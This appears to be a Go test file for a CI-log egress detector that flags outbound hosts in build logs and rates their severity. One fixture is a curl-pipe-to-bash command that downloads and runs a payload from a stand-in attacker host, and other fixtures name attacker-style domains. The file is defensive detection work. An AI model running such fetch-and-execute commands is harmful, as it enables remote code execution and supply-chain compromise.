package analysis

import (
	"strings"
	"testing"
)

func TestExtractEgressTargets_NilOnEmpty(t *testing.T) {
	if got := ExtractEgressTargets(nil); got != nil {
		t.Errorf("expected nil for empty logs, got %v", got)
	}
	if got := ExtractEgressTargets([]byte{}); got != nil {
		t.Errorf("expected nil for empty logs, got %v", got)
	}
}

func TestExtractEgressTargets_FindsHTTPHosts(t *testing.T) {
	logs := []byte(`
		+ curl -sSL https://evil.example.com/payload.sh | bash
		+ wget http://example.org/file.tgz
	`)
	got := ExtractEgressTargets(logs)
	hosts := hostsOf(got)
	wantHosts := []string{"evil.example.com", "example.org"}
	for _, w := range wantHosts {
		if !hasString(hosts, w) {
			t.Errorf("missing %q in extracted hosts %v", w, hosts)
		}
	}
}

func TestExtractEgressTargets_FiltersInherentHosts(t *testing.T) {
	logs := []byte(`
		Downloading https://api.github.com/repos/foo/bar/actions/runs/123
		Pulling https://registry.npmjs.org/express/-/express-4.18.0.tgz
		Hit: https://gitlab.com/api/v4/projects/9999
	`)
	got := ExtractEgressTargets(logs)
	if len(got) != 0 {
		t.Errorf("inherent CI hosts should be filtered, got %v", got)
	}
}

func TestExtractEgressTargets_FiltersPrivateAndLoopback(t *testing.T) {
	logs := []byte(`
		POST http://127.0.0.1:5432/db
		Connecting to http://10.0.0.5:8080/internal
		PUT http://192.168.1.1/config
		GET http://172.20.0.5:9000/cache
	`)
	got := ExtractEgressTargets(logs)
	if len(got) != 0 {
		t.Errorf("private + loopback should be filtered, got %v", got)
	}
}

func TestExtractEgressTargets_DeduplicatesAndCounts(t *testing.T) {
	logs := []byte(`
		https://stats.attacker.com/hit
		https://stats.attacker.com/hit2
		https://stats.attacker.com/hit3
	`)
	got := ExtractEgressTargets(logs)
	if len(got) != 1 {
		t.Fatalf("expected 1 unique host, got %v", got)
	}
	if got[0].Count != 3 {
		t.Errorf("expected count 3, got %d", got[0].Count)
	}
}

func TestExtractEgressTargets_StableOrdering(t *testing.T) {
	logs := []byte(`
		https://b.com
		https://a.com
		https://a.com
		https://c.com
	`)
	got := ExtractEgressTargets(logs)
	if len(got) != 3 {
		t.Fatalf("expected 3 hosts, got %d", len(got))
	}
	if got[0].Host != "a.com" {
		t.Errorf("a.com should rank first (highest count + alpha), got %v", got)
	}
}

func TestEvaluateEgress_AllowlistSilencesHosts(t *testing.T) {
	observed := []EgressTarget{
		{Host: "metrics.mycompany.com", Count: 5},
		{Host: "evil.example.com", Count: 2},
	}
	baseline := EgressBaseline{Allowlist: []string{"metrics.mycompany.com"}}
	findings := EvaluateEgress("conn1", "run1", observed, baseline)
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding (only off-baseline), got %d", len(findings))
	}
	if !strings.Contains(findings[0].Title, "evil.example.com") {
		t.Errorf("finding should be about evil.example.com, got %q", findings[0].Title)
	}
}

func TestEvaluateEgress_WildcardAllowlist(t *testing.T) {
	observed := []EgressTarget{
		{Host: "metrics.mycompany.com", Count: 1},
		{Host: "logs.mycompany.com", Count: 1},
		{Host: "evil.example.com", Count: 1},
	}
	baseline := EgressBaseline{Allowlist: []string{"*.mycompany.com"}}
	findings := EvaluateEgress("c", "r", observed, baseline)
	if len(findings) != 1 || !strings.Contains(findings[0].Title, "evil.example.com") {
		t.Errorf("wildcard should silence both mycompany subs, got %d findings: %v", len(findings), findings)
	}
}

func TestEvaluateEgress_RawIPIsCritical(t *testing.T) {
	observed := []EgressTarget{{Host: "192.0.2.55", Count: 1}}
	findings := EvaluateEgress("c", "r", observed, EgressBaseline{})
	if len(findings) != 1 || findings[0].Severity != SeverityCritical {
		t.Errorf("raw IP egress should be critical, got %v", findings)
	}
}

func TestEvaluateEgress_DGADomainIsCritical(t *testing.T) {
	observed := []EgressTarget{{Host: "xkjhrwqpoieumnbvasdf.com", Count: 1}}
	findings := EvaluateEgress("c", "r", observed, EgressBaseline{})
	if len(findings) != 1 || findings[0].Severity != SeverityCritical {
		t.Errorf("DGA-style domain should be critical, got %v", findings)
	}
}

func TestEvaluateEgress_FreeTLDIsCritical(t *testing.T) {
	for _, host := range []string{"payload.tk", "drop.ml", "stage.gq"} {
		findings := EvaluateEgress("c", "r", []EgressTarget{{Host: host, Count: 1}}, EgressBaseline{})
		if len(findings) != 1 || findings[0].Severity != SeverityCritical {
			t.Errorf("%s (free TLD) should be critical, got %v", host, findings)
		}
	}
}

func TestEvaluateEgress_NormalHostIsHigh(t *testing.T) {
	observed := []EgressTarget{{Host: "stats.example.com", Count: 1}}
	findings := EvaluateEgress("c", "r", observed, EgressBaseline{})
	if len(findings) != 1 || findings[0].Severity != SeverityHigh {
		t.Errorf("normal off-baseline host should be high, got %v", findings)
	}
}

func TestEvaluateEgress_FindingShape(t *testing.T) {
	observed := []EgressTarget{{Host: "x.example.com", Count: 4}}
	findings := EvaluateEgress("conn-a", "run-99", observed, EgressBaseline{})
	if len(findings) != 1 {
		t.Fatal("expected 1 finding")
	}
	f := findings[0]
	if f.ConnectionName != "conn-a" || f.RunID != "run-99" {
		t.Errorf("connection/runID not stamped: %+v", f)
	}
	if f.Category != CategoryEgress {
		t.Errorf("category should be egress, got %q", f.Category)
	}
	if f.Status != "open" {
		t.Errorf("status should be open, got %q", f.Status)
	}
	if !strings.Contains(f.Description, "supply-chain") {
		t.Errorf("description should reference supply-chain context, got %q", f.Description)
	}
}

func TestNormalizeHost(t *testing.T) {
	cases := map[string]string{
		"Example.COM":  "example.com",
		"example.com.": "example.com",
		"example.com,": "example.com",
		"::1":          "",
		"":             "",
	}
	for in, want := range cases {
		if got := normalizeHost(in); got != want {
			t.Errorf("normalizeHost(%q) = %q, want %q", in, got, want)
		}
	}
}

func hostsOf(targets []EgressTarget) []string {
	out := make([]string, len(targets))
	for i, t := range targets {
		out[i] = t.Host
	}
	return out
}

func hasString(ss []string, s string) bool {
	for _, v := range ss {
		if v == s {
			return true
		}
	}
	return false
}
